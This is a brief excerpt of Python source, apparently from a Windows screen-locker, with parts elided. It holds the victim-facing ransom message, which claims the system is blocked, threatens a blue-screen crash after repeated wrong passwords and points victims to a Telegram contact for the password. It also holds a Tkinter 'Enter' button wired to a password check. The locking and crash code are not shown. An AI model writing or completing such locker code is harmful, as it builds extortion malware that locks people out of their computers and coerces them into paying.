...
lock_text = f"Your Windows is blocked, and any attempts to bypass locker will lead to problems with the system. \nIf you enter the wrong password {count} times, the BSOD (death screen) will start. \nTo request a password, write to telegram:@{tg_username}\n\n"
...
button = Button(wind,text='Enter',padx="31", pady="19",bg='black',fg='red',font="helvetica 30", command=check)
button.pack()
